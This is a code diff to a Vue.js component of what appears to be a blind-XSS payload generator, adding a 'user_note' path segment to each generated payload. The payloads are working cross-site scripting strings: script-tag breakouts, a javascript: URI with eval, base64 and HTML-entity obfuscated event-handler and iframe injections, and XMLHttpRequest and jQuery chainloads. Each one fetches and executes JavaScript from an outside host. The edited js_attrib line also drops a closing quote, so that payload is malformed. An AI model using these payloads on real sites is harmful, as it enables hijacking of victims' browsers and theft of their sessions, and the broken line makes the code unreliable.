@@ -13,6 +13,7 @@
                             <h6 class="card-subtitle mb-2 text-muted">{{payload.description}}</h6>
                             <p class="card-text">
                                 <base-input type="text" v-bind:value="payload.func()" placeholder="..."></base-input>
+                                <base-input type="text" v-bind:value="user_note" placeholder="..."></base-input>
                             </p>
                             <base-button type="primary" v-clipboard:copy="payload.func()">
                             <span style="display: inline-block; margin-right: 6px;"><i class="far fa-copy"></i></span>
@@ -80,18 +81,19 @@ export default {
             ],
 
             base_domain: '',
+            user_note:''
         }
     },
     watch: {},
     methods: {
         js_attrib: function() {
-            return 'var a=document.createElement("script");a.src="https://' + this.base_domain + '";document.body.appendChild(a);';
+            return 'var a=document.createElement("script");a.src="https://' + this.base_domain + '/' + this.user_note + ";document.body.appendChild(a);';
         },
         basic_script: function() {
-            return "\"><script src=\"https://" + this.base_domain + "\"><\/script>";
+            return "\"><script src=\"https://" + this.base_domain + '/' + this.user_note +  "\"><\/script>";
         },
         javascript_uri: function() {
-            return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + this.base_domain + "\\';document.body.appendChild(a)')";
+            return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + this.base_domain + '/' + this.user_note +  "\\';document.body.appendChild(a)')";
         },
         input_onfocus: function() {
             return "\"><input onfocus=eval(atob(this.id)) id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + " autofocus>";
@@ -103,13 +105,13 @@ export default {
             return "\"><video><source onerror=eval(atob(this.id)) id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + ">";
         },
         iframe_srcdoc: function() {
-            return "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;" + this.base_domain + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">";
+            return "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;" + this.base_domain + '/' + this.user_note +  "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">";
         },
         xmlhttprequest_load: function() {
             return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://' + this.base_domain + '");a.send();<\/script>'
         },
         jquery_chainload: function() {
-            return '<script>$.getScript("https://' + this.base_domain + '")<\/script>';
+            return '<script>$.getScript("https://' + this.base_domain + '/' + this.user_note +  '")<\/script>';
         },
     },
     computed: {},
